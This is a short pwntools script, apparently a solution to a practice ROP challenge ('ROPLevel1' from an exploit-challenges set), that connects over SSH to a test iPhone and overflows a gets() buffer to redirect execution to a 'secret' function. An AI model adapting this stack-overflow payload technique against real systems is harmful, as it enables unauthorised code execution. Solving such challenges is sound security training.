from pwn import *

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel1/roplevel1")
p.recvuntil(b"warning: this program uses gets(), which is unsafe.")

addr_change = 0xbe2c + 4
addr_secret = 0xbe70 + 4

payload = b"A" * 0x14
payload += p32(addr_change)
payload += b"BBBB" # r7
payload += p32(addr_secret) # pc

p.sendline(payload)
print(p.recvall())
